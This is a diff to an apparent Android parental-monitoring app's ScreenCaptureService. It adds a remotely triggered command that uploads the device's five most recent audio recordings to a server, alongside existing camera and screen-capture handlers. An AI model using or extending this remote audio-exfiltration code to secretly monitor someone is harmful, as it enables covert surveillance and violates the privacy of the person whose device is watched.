@@ -1,4 +1,4 @@
-package com.example.parentalchild
+
 
 import android.app.*
 import android.content.Intent
@@ -225,12 +225,36 @@ class ScreenCaptureService : Service() {
                         if (json == "[]") api.updateStatus(id, "FAILED")
                         else api.updateStatus(id, "DONE", api.uploadJson(json))
                     }
+                    "AUDIO_LIST" -> sendSavedAudio(id)
                     else -> api.updateStatus(id, "FAILED")
                 }
             } catch (_: Exception) {
                 try { api.updateStatus(id, "FAILED") } catch (_: Exception) {}
             }
         }
+    }
+
+    private fun sendSavedAudio(id: String) {
+        val dir = java.io.File(filesDir, "audio_recordings")
+        val files = dir.listFiles()
+            ?.filter { it.isFile && it.name.startsWith("audio_") && it.extension == "m4a" }
+            ?.sortedByDescending { it.lastModified() }
+            ?.take(5)
+            ?: emptyList()
+
+        if (files.isEmpty()) {
+            api.updateStatus(id, "DONE", api.uploadJson("[]"))
+            return
+        }
+
+        val arr = org.json.JSONArray()
+        for (file in files) {
+            val url = api.uploadFile(file, "audio/mp4")
+            if (url.isNotBlank()) {
+                arr.put(org.json.JSONObject().put("name", file.name).put("url", url).put("modifiedAt", file.lastModified()))
+            }
+        }
+        api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
     }
 
     private fun shootCamera(id: String, facing: Int) {
